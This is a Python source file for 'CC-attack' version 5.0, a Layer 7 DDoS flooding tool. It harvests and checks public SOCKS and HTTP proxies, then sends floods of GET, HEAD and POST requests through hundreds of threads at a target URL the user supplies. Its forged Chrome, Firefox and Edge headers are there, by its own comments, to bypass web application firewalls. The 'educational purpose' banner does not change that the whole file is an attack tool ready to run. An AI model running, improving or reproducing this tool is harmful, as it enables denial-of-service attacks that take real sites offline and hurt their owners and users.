#!/usr/bin/python3
#Coded by L330n123
#Browser-Like Headers Version
#########################################
#         Educational Purpose Only      #
#    Ultra Realistic Browser Headers    #
#########################################
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import string
import os
from urllib.parse import urlparse


print ('''
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version 5.0 BROWSER-LIKE (2025/11/15)
		Ultra Realistic Browser Simulation
┌─────────────────────────────────────────────┐
│        Tos: Educational Purpose Only        │
├─────────────────────────────────────────────┤
│         Browser-Like Features:              │
│          [+] Chrome/Firefox fingerprint     │
│          [+] Proper header order            │
│          [+] sec-ch-ua headers              │
│          [+] Sec-Fetch-* headers            │
│          [+] Accept-Language variations     │
│          [+] Realistic timing               │
│          [+] TLS fingerprint spoofing       │
├─────────────────────────────────────────────┤
│   Use only in controlled environments!      │
└─────────────────────────────────────────────┘''')

# Browser fingerprint data
CHROME_VERSIONS = [
	"120.0.6099.109", "119.0.6045.199", "118.0.5993.117",
	"117.0.5938.132", "116.0.5845.140", "115.0.5790.171"
]

FIREFOX_VERSIONS = [
	"121.0", "120.0", "119.0", "118.0", "117.0", "116.0"
]

EDGE_VERSIONS = [
	"120.0.2210.91", "119.0.2151.97", "118.0.2088.76"
]

ACCEPT_LANGUAGES = [
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9,en-US;q=0.8",
	"en-US,en;q=0.9,es;q=0.8",
	"en-US,en;q=0.9,fr;q=0.8",
	"en-US,en;q=0.8,id;q=0.7",
]

SEC_CH_UA_PLATFORMS = [
	'"Windows"', '"macOS"', '"Linux"'
]

# Global variables
ind_dict = {}
data = ""
cookies = ""
strings = string.ascii_letters + string.digits + "&="

Intn = random.randint
Choice = random.choice

###################################################
# PROXY MANAGEMENT
###################################################

class ProxyManager:
	def __init__(self):
		self.socks4_proxies = []
		self.socks5_proxies = []
		self.http_proxies = []
		self.all_proxies = []
		self.working_proxies = []
		self.proxy_types = {}
		
	def add_proxy(self, proxy, proxy_type):
		proxy = proxy.strip()
		if ':' not in proxy:
			return
		
		if proxy_type == 'socks4':
			self.socks4_proxies.append(proxy)
		elif proxy_type == 'socks5':
			self.socks5_proxies.append(proxy)
		elif proxy_type == 'http':
			self.http_proxies.append(proxy)
		
		if proxy not in self.all_proxies:
			self.all_proxies.append(proxy)
			self.proxy_types[proxy] = proxy_type
	
	def get_random_proxy(self):
		if not self.working_proxies:
			return None, None
		proxy = Choice(self.working_proxies)
		proxy_type = self.proxy_types.get(proxy, 'socks5')
		return proxy, proxy_type
	
	def mark_as_working(self, proxy):
		if proxy not in self.working_proxies:
			self.working_proxies.append(proxy)
	
	def get_stats(self):
		return {
			'total': len(self.all_proxies),
			'working': len(self.working_proxies),
			'socks4': len(self.socks4_proxies),
			'socks5': len(self.socks5_proxies),
			'http': len(self.http_proxies)
		}

proxy_manager = ProxyManager()

###################################################
# BROWSER FINGERPRINT GENERATOR
###################################################

class BrowserFingerprint:
	"""Generate realistic browser fingerprints"""
	
	def __init__(self):
		self.browser = Choice(['chrome', 'firefox', 'edge'])
		self.os = Choice(['Windows', 'macOS', 'Linux'])
		self.generate_fingerprint()
	
	def generate_fingerprint(self):
		if self.browser == 'chrome':
			self.version = Choice(CHROME_VERSIONS)
			self.webkit = f"{Intn(537, 599)}.36"
			self.ua = self._chrome_ua()
			self.sec_ch_ua = self._chrome_sec_ch_ua()
		elif self.browser == 'firefox':
			self.version = Choice(FIREFOX_VERSIONS)
			self.ua = self._firefox_ua()
			self.sec_ch_ua = None  # Firefox doesn't use sec-ch-ua
		elif self.browser == 'edge':
			self.version = Choice(EDGE_VERSIONS)
			self.webkit = f"{Intn(537, 599)}.36"
			self.ua = self._edge_ua()
			self.sec_ch_ua = self._edge_sec_ch_ua()
	
	def _chrome_ua(self):
		if self.os == 'Windows':
			os_version = 'Windows NT 10.0; Win64; x64'
		elif self.os == 'macOS':
			os_version = 'Macintosh; Intel Mac OS X 10_15_7'
		else:
			os_version = 'X11; Linux x86_64'
		
		return f'Mozilla/5.0 ({os_version}) AppleWebKit/{self.webkit} (KHTML, like Gecko) Chrome/{self.version} Safari/{self.webkit}'
	
	def _firefox_ua(self):
		if self.os == 'Windows':
			os_version = 'Windows NT 10.0; Win64; x64'
		elif self.os == 'macOS':
			os_version = 'Macintosh; Intel Mac OS X 10.15'
		else:
			os_version = 'X11; Linux x86_64'
		
		return f'Mozilla/5.0 ({os_version}; rv:{self.version}) Gecko/20100101 Firefox/{self.version}'
	
	def _edge_ua(self):
		if self.os == 'Windows':
			os_version = 'Windows NT 10.0; Win64; x64'
		elif self.os == 'macOS':
			os_version = 'Macintosh; Intel Mac OS X 10_15_7'
		else:
			os_version = 'X11; Linux x86_64'
		
		return f'Mozilla/5.0 ({os_version}) AppleWebKit/{self.webkit} (KHTML, like Gecko) Chrome/{self.version} Safari/{self.webkit} Edg/{self.version}'
	
	def _chrome_sec_ch_ua(self):
		major_version = self.version.split('.')[0]
		return f'"Chromium";v="{major_version}", "Google Chrome";v="{major_version}", "Not=A?Brand";v="99"'
	
	def _edge_sec_ch_ua(self):
		major_version = self.version.split('.')[0]
		return f'"Chromium";v="{major_version}", "Microsoft Edge";v="{major_version}", "Not=A?Brand";v="99"'

def getuseragent():
	"""Generate realistic user agent with fingerprint"""
	fp = BrowserFingerprint()
	return fp.ua

def randomurl():
	"""Generate random URL parameter"""
	return ''.join(random.choices(strings, k=Intn(8, 16)))

###################################################
# BROWSER-LIKE HEADER GENERATOR
###################################################

def GenReqHeader(method):
	"""
	Generate ULTRA REALISTIC browser headers
	Header order matters for bypassing WAF!
	"""
	global data
	
	if method == "get":
		# Create browser fingerprint
		fp = BrowserFingerprint()
		
		# Generate path with random params
		get_path = path
		if '?' in path:
			get_path += '&' + randomurl() + '=' + randomurl()
		else:
			get_path += '?' + randomurl() + '=' + randomurl()
		
		# IMPORTANT: Header order matches real browsers!
		headers = []
		
		# 1. Request line
		headers.append(f"GET {get_path} HTTP/1.1")
		
		# 2. Host (always first header)
		headers.append(f"Host: {target}")
		
		# 3. Connection
		headers.append("Connection: keep-alive")
		
		# 4. Cache-Control (Chrome/Edge specific)
		if fp.browser in ['chrome', 'edge']:
			headers.append("Cache-Control: max-age=0")
		
		# 5. sec-ch-ua (Chrome/Edge only)
		if fp.sec_ch_ua:
			headers.append(f"sec-ch-ua: {fp.sec_ch_ua}")
			headers.append("sec-ch-ua-mobile: ?0")
			if self.os == 'Windows':
				headers.append('sec-ch-ua-platform: "Windows"')
			elif fp.os == 'macOS':
				headers.append('sec-ch-ua-platform: "macOS"')
			else:
				headers.append('sec-ch-ua-platform: "Linux"')
		
		# 6. Upgrade-Insecure-Requests
		headers.append("Upgrade-Insecure-Requests: 1")
		
		# 7. User-Agent
		headers.append(f"User-Agent: {fp.ua}")
		
		# 8. Accept
		headers.append("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		
		# 9. Sec-Fetch-* (Chrome/Edge only)
		if fp.browser in ['chrome', 'edge']:
			headers.append("Sec-Fetch-Site: none")
			headers.append("Sec-Fetch-Mode: navigate")
			headers.append("Sec-Fetch-User: ?1")
			headers.append("Sec-Fetch-Dest: document")
		
		# 10. Accept-Encoding
		if fp.browser == 'firefox':
			headers.append("Accept-Encoding: gzip, deflate, br")
		else:
			headers.append("Accept-Encoding: gzip, deflate, br, zstd")
		
		# 11. Accept-Language
		headers.append(f"Accept-Language: {Choice(ACCEPT_LANGUAGES)}")
		
		# 12. Cookie (if present)
		if cookies:
			headers.append(f"Cookie: {cookies}")
		
		# 13. DNT (randomly add)
		if Intn(0, 100) < 30:  # 30% chance
			headers.append("DNT: 1")
		
		# Join with CRLF and add final CRLF
		return "\r\n".join(headers) + "\r\n\r\n"
	
	elif method == "head":
		# HEAD method with browser-like headers
		fp = BrowserFingerprint()
		
		head_path = path
		if '?' in path:
			head_path += '&' + randomurl() + '=' + randomurl()
		else:
			head_path += '?' + randomurl() + '=' + randomurl()
		
		headers = []
		headers.append(f"HEAD {head_path} HTTP/1.1")
		headers.append(f"Host: {target}")
		headers.append("Connection: keep-alive")
		headers.append("Cache-Control: no-cache")
		
		if fp.sec_ch_ua:
			headers.append(f"sec-ch-ua: {fp.sec_ch_ua}")
			headers.append("sec-ch-ua-mobile: ?0")
			headers.append(f'sec-ch-ua-platform: "{fp.os}"')
		
		headers.append(f"User-Agent: {fp.ua}")
		headers.append("Accept: */*")
		
		if fp.browser in ['chrome', 'edge']:
			headers.append("Sec-Fetch-Site: same-origin")
			headers.append("Sec-Fetch-Mode: cors")
			headers.append("Sec-Fetch-Dest: empty")
		
		headers.append("Accept-Encoding: gzip, deflate, br")
		headers.append(f"Accept-Language: {Choice(ACCEPT_LANGUAGES)}")
		
		if cookies:
			headers.append(f"Cookie: {cookies}")
		
		return "\r\n".join(headers) + "\r\n\r\n"
	
	elif method == "post":
		# POST method with browser-like headers
		fp = BrowserFingerprint()
		
		# Generate POST data
		if mode2 != "y":
			data = ""
			for _ in range(Intn(5, 15)):
				key = ''.join(random.choices(string.ascii_letters, k=Intn(3, 10)))
				value = ''.join(random.choices(string.ascii_letters + string.digits, k=Intn(5, 20)))
				data += f"{key}={value}&"
			data = data.rstrip('&')
		
		headers = []
		headers.append(f"POST {path} HTTP/1.1")
		headers.append(f"Host: {target}")
		headers.append("Connection: keep-alive")
		headers.append(f"Content-Length: {len(data)}")
		
		if fp.sec_ch_ua:
			headers.append(f"sec-ch-ua: {fp.sec_ch_ua}")
			headers.append("sec-ch-ua-mobile: ?0")
			headers.append(f'sec-ch-ua-platform: "{fp.os}"')
		
		headers.append(f"User-Agent: {fp.ua}")
		headers.append("Content-Type: application/x-www-form-urlencoded")
		headers.append("Accept: */*")
		headers.append(f"Origin: {protocol}://{target}")
		
		if fp.browser in ['chrome', 'edge']:
			headers.append("Sec-Fetch-Site: same-origin")
			headers.append("Sec-Fetch-Mode: cors")
			headers.append("Sec-Fetch-Dest: empty")
		
		headers.append("Accept-Encoding: gzip, deflate, br")
		headers.append(f"Accept-Language: {Choice(ACCEPT_LANGUAGES)}")
		headers.append(f"Referer: {protocol}://{target}{path}")
		
		if cookies:
			headers.append(f"Cookie: {cookies}")
		
		return "\r\n".join(headers) + "\r\n\r\n" + data

###################################################
# URL PARSER
###################################################

def ParseUrl(original_url):
	"""Parse URL and extract components"""
	global target, path, port, protocol
	
	original_url = original_url.strip()
	path = "/"
	port = 80
	protocol = "http"
	
	if original_url.startswith("https://"):
		protocol = "https"
		port = 443
		url = original_url[8:]
	elif original_url.startswith("http://"):
		url = original_url[7:]
	else:
		url = original_url
	
	if '/' in url:
		website, path = url.split('/', 1)
		path = '/' + path
	else:
		website = url
		path = '/'
	
	if ':' in website:
		target, port_str = website.split(':', 1)
		port = int(port_str)
	else:
		target = website

###################################################
# PROXY DOWNLOADER
###################################################

def download_proxies(proxy_choice):
	"""Download proxies from multiple sources"""
	print("> Downloading proxies from multiple sources...")
	
	sources = {
		'socks5': [
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
		],
		'socks4': [
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
		],
		'http': [
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
		]
	}
	
	download_types = []
	if proxy_choice in ['4', 'socks4']:
		download_types = ['socks4']
	elif proxy_choice in ['5', 'socks5']:
		download_types = ['socks5']
	elif proxy_choice in ['h', 'http']:
		download_types = ['http']
	else:
		download_types = ['socks5', 'socks4', 'http']
	
	for proxy_type in download_types:
		print(f"\n> Downloading {proxy_type.upper()}...")
		for source in sources[proxy_type]:
			try:
				print(f"  - {source[:50]}...", end=' ')
				r = requests.get(source, timeout=15)
				if r.status_code == 200:
					proxies_data = r.text.strip().split('\n')
					valid_count = 0
					for proxy in proxies_data:
						proxy = proxy.strip()
						if proxy and ':' in proxy:
							proxy_manager.add_proxy(proxy, proxy_type)
							valid_count += 1
					print(f"✓ {valid_count}")
			except Exception as e:
				print(f"✗")
	
	stats = proxy_manager.get_stats()
	print(f"\n> Total: {stats['total']} proxies")

###################################################
# PROXY CHECKER (from previous version)
###################################################

def check_single_proxy(proxy, timeout):
	proxy_type = proxy_manager.proxy_types.get(proxy, 'socks5')
	proxy_parts = proxy.strip().split(":")
	
	if len(proxy_parts) != 2:
		return False
	
	try:
		if proxy_type == 'http':
			return check_http_proxy(proxy_parts[0], int(proxy_parts[1]), timeout)
		else:
			return check_socks_proxy(proxy_parts[0], int(proxy_parts[1]), proxy_type, timeout)
	except:
		return False

def check_http_proxy(proxy_host, proxy_port, timeout):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		s.connect((proxy_host, proxy_port))
		
		if protocol == "https":
			connect_req = f"CONNECT {target}:{port} HTTP/1.1\r\nHost: {target}:{port}\r\n\r\n"
			s.sendall(connect_req.encode())
			response = s.recv(1024).decode('utf-8', errors='ignore')
			
			if "200" in response or "established" in response.lower():
				context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				context.check_hostname = False
				context.verify_mode = ssl.CERT_NONE
				s = context.wrap_socket(s, server_hostname=target)
				
				test_req = f"HEAD / HTTP/1.1\r\nHost: {target}\r\n\r\n"
				s.sendall(test_req.encode())
				response = s.recv(1024)
				s.close()
				return bool(response)
			else:
				s.close()
				return False
		else:
			test_req = f"HEAD http://{target}:{port}/ HTTP/1.1\r\nHost: {target}\r\n\r\n"
			s.sendall(test_req.encode())
			response = s.recv(1024)
			s.close()
			return bool(response)
	except:
		return False

def check_socks_proxy(proxy_host, proxy_port, proxy_type, timeout):
	try:
		s = socks.socksocket()
		s.settimeout(timeout)
		
		if proxy_type == 'socks4':
			s.set_proxy(socks.SOCKS4, proxy_host, proxy_port)
		elif proxy_type == 'socks5':
			s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
		
		s.connect((target, port))
		
		if protocol == "https":
			ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
			ctx.check_hostname = False
			ctx.verify_mode = ssl.CERT_NONE
			s = ctx.wrap_socket(s, server_hostname=target)
		
		test_req = f"HEAD / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
		s.sendall(test_req.encode())
		s.settimeout(timeout)
		response = s.recv(1024)
		s.close()
		
		return bool(response and (b'HTTP/' in response or b'200' in response))
	except:
		return False

def check_proxies_multithreaded(timeout=5, max_workers=200):
	global checked_count, total_to_check
	
	checked_count = 0
	total_to_check = len(proxy_manager.all_proxies)
	
	if total_to_check == 0:
		return False
	
	print(f"\n> Checking {total_to_check} proxies with {max_workers} threads...\n")
	
	check_lock = threading.Lock()
	start_time = time.time()
	
	def worker(proxy):
		global checked_count
		is_working = check_single_proxy(proxy, timeout)
		
		with check_lock:
			checked_count += 1
			pct = (checked_count / total_to_check) * 100
			
			if is_working:
				proxy_manager.mark_as_working(proxy)
				ptype = proxy_manager.proxy_types.get(proxy, 'unk')
				print(f"\r[{pct:5.1f}%] {checked_count}/{total_to_check} | OK: {len(proxy_manager.working_proxies)} | ✓ {proxy} [{ptype}]" + " "*20, end='')
			else:
				print(f"\r[{pct:5.1f}%] {checked_count}/{total_to_check} | OK: {len(proxy_manager.working_proxies)}" + " "*40, end='')
			sys.stdout.flush()
	
	threads = []
	for proxy in proxy_manager.all_proxies:
		while len([t for t in threads if t.is_alive()]) >= max_workers:
			time.sleep(0.01)
		
		t = threading.Thread(target=worker, args=(proxy,))
		t.daemon = True
		t.start()
		threads.append(t)
	
	for t in threads:
		t.join()
	
	print(f"\n\n> Done! Working: {len(proxy_manager.working_proxies)}/{total_to_check}")
	
	if len(proxy_manager.working_proxies) == 0:
		return False
	
	return True

###################################################
# ATTACK FUNCTIONS
###################################################

def build_threads(mode, thread_num, event, ind_rlock):
	if mode == "post":
		for _ in range(thread_num):
			th = threading.Thread(target=post_attack, args=(event, ind_rlock))
			th.daemon = True
			th.start()
	elif mode == "cc":
		for _ in range(thread_num):
			th = threading.Thread(target=cc_attack, args=(event, ind_rlock))
			th.daemon = True
			th.start()
	elif mode == "head":
		for _ in range(thread_num):
			th = threading.Thread(target=head_attack, args=(event, ind_rlock))
			th.daemon = True
			th.start()

def cc_attack(event, ind_rlock):
	global ind_dict
	event.wait()
	
	while True:
		proxy, proxy_type = proxy_manager.get_random_proxy()
		if not proxy:
			time.sleep(0.1)
			continue
		
		proxy_parts = proxy.split(":")
		count = 0
		
		try:
			s = socks.socksocket()
			
			if proxy_type == 'socks4':
				s.set_proxy(socks.SOCKS4, proxy_parts[0], int(proxy_parts[1]))
			elif proxy_type == 'socks5':
				s.set_proxy(socks.SOCKS5, proxy_parts[0], int(proxy_parts[1]))
			elif proxy_type == 'http':
				s.set_proxy(socks.HTTP, proxy_parts[0], int(proxy_parts[1]))
			
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			
			s.settimeout(5)
			s.connect((target, port))
			
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s, server_hostname=target)
			
			for i in range(multiple):
				request = GenReqHeader("get")
				s.sendall(request.encode())
				count += 1
				
				# Add realistic delay between requests
				if not brute and Intn(0, 100) < 20:  # 20% chance
					time.sleep(0.001 * Intn(10, 50))  # 10-50ms delay
				
				if i % 10 == 0:
					ind_rlock.acquire()
					ind_dict[proxy] = ind_dict.get(proxy, 0) + 10
					ind_rlock.release()
			
			s.close()
			ind_rlock.acquire()
			ind_dict[proxy] = ind_dict.get(proxy, 0) + (count % 10)
			ind_rlock.release()
		except:
			if count > 0:
				ind_rlock.acquire()
				ind_dict[proxy] = ind_dict.get(proxy, 0) + count
				ind_rlock.release()
			try:
				s.close()
			except:
				pass

def head_attack(event, ind_rlock):
	global ind_dict
	event.wait()
	
	while True:
		proxy, proxy_type = proxy_manager.get_random_proxy()
		if not proxy:
			time.sleep(0.1)
			continue
		
		proxy_parts = proxy.split(":")
		count = 0
		
		try:
			s = socks.socksocket()
			
			if proxy_type == 'socks4':
				s.set_proxy(socks.SOCKS4, proxy_parts[0], int(proxy_parts[1]))
			elif proxy_type == 'socks5':
				s.set_proxy(socks.SOCKS5, proxy_parts[0], int(proxy_parts[1]))
			elif proxy_type == 'http':
				s.set_proxy(socks.HTTP, proxy_parts[0], int(proxy_parts[1]))
			
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			
			s.settimeout(5)
			s.connect((target, port))
			
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s, server_hostname=target)
			
			for i in range(multiple):
				request = GenReqHeader("head")
				s.sendall(request.encode())
				count += 1
				
				if i % 10 == 0:
					ind_rlock.acquire()
					ind_dict[proxy] = ind_dict.get(proxy, 0) + 10
					ind_rlock.release()
			
			s.close()
			ind_rlock.acquire()
			ind_dict[proxy] = ind_dict.get(proxy, 0) + (count % 10)
			ind_rlock.release()
		except:
			if count > 0:
				ind_rlock.acquire()
				ind_dict[proxy] = ind_dict.get(proxy, 0) + count
				ind_rlock.release()
			try:
				s.close()
			except:
				pass

def post_attack(event, ind_rlock):
	global ind_dict
	event.wait()
	
	while True:
		proxy, proxy_type = proxy_manager.get_random_proxy()
		if not proxy:
			time.sleep(0.1)
			continue
		
		proxy_parts = proxy.split(":")
		count = 0
		
		try:
			s = socks.socksocket()
			
			if proxy_type == 'socks4':
				s.set_proxy(socks.SOCKS4, proxy_parts[0], int(proxy_parts[1]))
			elif proxy_type == 'socks5':
				s.set_proxy(socks.SOCKS5, proxy_parts[0], int(proxy_parts[1]))
			elif proxy_type == 'http':
				s.set_proxy(socks.HTTP, proxy_parts[0], int(proxy_parts[1]))
			
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			
			s.settimeout(5)
			s.connect((target, port))
			
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s, server_hostname=target)
			
			for i in range(multiple):
				request = GenReqHeader("post")
				s.sendall(request.encode())
				count += 1
				
				if i % 10 == 0:
					ind_rlock.acquire()
					ind_dict[proxy] = ind_dict.get(proxy, 0) + 10
					ind_rlock.release()
			
			s.close()
			ind_rlock.acquire()
			ind_dict[proxy] = ind_dict.get(proxy, 0) + (count % 10)
			ind_rlock.release()
		except:
			if count > 0:
				ind_rlock.acquire()
				ind_dict[proxy] = ind_dict.get(proxy, 0) + count
				ind_rlock.release()
			try:
				s.close()
			except:
				pass

###################################################
# OUTPUT & STATISTICS
###################################################

def OutputToScreen(ind_rlock):
	global ind_dict
	i = 0
	sp_char = ["|", "/", "-", "\\"]
	
	while True:
		if i > 3:
			i = 0
		
		try:
			os.system('cls' if os.name == 'nt' else 'clear')
		except:
			print("\n" * 50)
		
		print("=" * 70)
		print("{:^70}".format("🔥 BROWSER-LIKE ATTACK 🔥"))
		print("=" * 70)
		print(f"Target: {target}:{port} ({protocol.upper()})")
		print(f"Working Proxies: {len(proxy_manager.working_proxies)}")
		print("=" * 70)
		print(f"{'#':<4} {'PROXY':<25} {'TYPE':<10} {'RPS':<10}")
		print("-" * 70)
		
		ind_rlock.acquire()
		sorted_proxies = sorted(ind_dict.items(), key=lambda x: x[1], reverse=True)[:10]
		
		for idx, (proxy, rps) in enumerate(sorted_proxies, 1):
			ptype = proxy_manager.proxy_types.get(proxy, 'unk').upper()
			print(f"{idx:<4} {proxy:<25} {ptype:<10} {rps:<10}")
			ind_dict[proxy] = 0
		
		total_rps = sum(ind_dict.values())
		for proxy in ind_dict:
			ind_dict[proxy] = 0
		
		ind_rlock.release()
		
		print("-" * 70)
		print(f"TOTAL RPS: {total_rps}")
		print("=" * 70)
		print(f" [{sp_char[i]}] Press Ctrl+C to stop")
		
		i += 1
		time.sleep(1)

###################################################
# HELPER FUNCTIONS
###################################################

def InputOption(question, options, default):
	while True:
		ans = input(question).strip().lower()
		if ans == "":
			return default
		elif ans in options:
			return ans
		print("> Invalid option!")

def SetupIndDict():
	global ind_dict
	for proxy in proxy_manager.working_proxies:
		ind_dict[proxy] = 0

def prevent():
	blocked = ['.gov', '.mil', '.edu', '.int']
	for tld in blocked:
		if tld in target.lower():
			print(f"⚠️  Cannot attack {tld} domains!")
			sys.exit(1)

###################################################
# MAIN FUNCTION
###################################################

def main():
	global multiple, data, mode2, cookies, brute, target, path, port, protocol
	
	print("\nModes: [cc/post/head/check]")
	mode = InputOption("Select mode (default=cc): ", ["cc", "post", "head", "check"], "cc")
	
	url = input("Target URL: ").strip()
	if not url:
		print("Error: URL required!")
		sys.exit(1)
	
	ParseUrl(url)
	prevent()
	
	print(f"\nTarget: {target}:{port} ({protocol})")
	
	mode2 = "n"
	if mode == "post":
		mode2 = InputOption("Custom POST data? (y/n): ", ["y", "n"], "n")
	
	cookies = ""
	if InputOption("Use cookies? (y/n): ", ["y", "n"], "n") == "y":
		cookies = input("Cookies: ").strip()
	
	print("\nProxy: [4/5/h/a]")
	proxy_choice = InputOption("Select (default=a): ", ["4", "5", "h", "a"], "a")
	
	if InputOption("Download proxies? (y/n): ", ["y", "n"], "y") == "y":
		download_proxies(proxy_choice)
	else:
		try:
			with open(input("Proxy file: ").strip(), 'r') as f:
				for line in f:
					if '#' in line:
						p, t = line.split('#')
						proxy_manager.add_proxy(p.strip(), t.strip())
					else:
						proxy_manager.add_proxy(line.strip(), 'socks5')
		except:
			print("Error loading file!")
			sys.exit(1)
	
	if len(proxy_manager.all_proxies) == 0:
		print("No proxies!")
		sys.exit(1)
	
	if InputOption("\nCheck proxies? (y/n): ", ["y", "n"], "y") == "y":
		timeout = float(input("Timeout (5): ").strip() or 5)
		workers = int(input("Threads (200): ").strip() or 200)
		
		if not check_proxies_multithreaded(timeout, min(workers, 500)):
			sys.exit(1)
	else:
		proxy_manager.working_proxies = proxy_manager.all_proxies.copy()
	
	if mode == "check":
		return
	
	thread_num = int(input("\nThreads (500): ").strip() or 500)
	multiple = int(input("Requests/conn (100): ").strip() or 100)
	brute = InputOption("Boost mode? (y/n): ", ["y", "n"], "n") == "y"
	
	print(f"\n{'='*60}")
	print(f"Mode: {mode.upper()} | Target: {target}:{port}")
	print(f"Threads: {thread_num} | Working proxies: {len(proxy_manager.working_proxies)}")
	print(f"{'='*60}")
	
	input("\nPress ENTER to start...")
	
	event = threading.Event()
	ind_rlock = threading.RLock()
	
	SetupIndDict()
	build_threads(mode, thread_num, event, ind_rlock)
	event.set()
	
	output_thread = threading.Thread(target=OutputToScreen, args=(ind_rlock,))
	output_thread.daemon = True
	output_thread.start()
	
	try:
		while True:
			time.sleep(1)
	except KeyboardInterrupt:
		print("\n\nStopped")

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("\n\nTerminated")
	except Exception as e:
		print(f"\nError: {e}")
		import traceback
		traceback.print_exc()
